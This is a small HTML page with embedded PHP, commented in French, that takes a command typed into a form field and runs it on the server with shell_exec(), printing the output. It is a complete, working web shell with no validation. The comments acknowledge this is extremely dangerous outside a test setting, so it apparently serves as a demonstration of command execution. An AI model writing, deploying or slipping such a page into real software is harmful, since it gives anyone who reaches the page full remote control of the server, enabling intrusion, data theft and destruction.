<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
</head>
<body>
    <h1>Command Execution</h1>
    <form method="post">
        <label for="command">Entrez une commande à exécuter :</label><br>
        <input type="text" id="command" name="command"><br><br>
        <input type="submit" value="Exécuter">
    </form>

    <h2>Résultat de la commande :</h2>
    <pre>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération de la commande saisie par l'utilisateur
    $command = $_POST["command"];

    // Validation de la commande (à adapter selon les besoins de sécurité)
    // Ici, nous n'effectuons aucune validation, ce qui est extrêmement dangereux dans un environnement réel

    // Exécution de la commande en mode shell
    $output = shell_exec($command);

    // Affichage du résultat de la commande
    echo htmlspecialchars($output);
}
?>
    </pre>
</body>
</html>
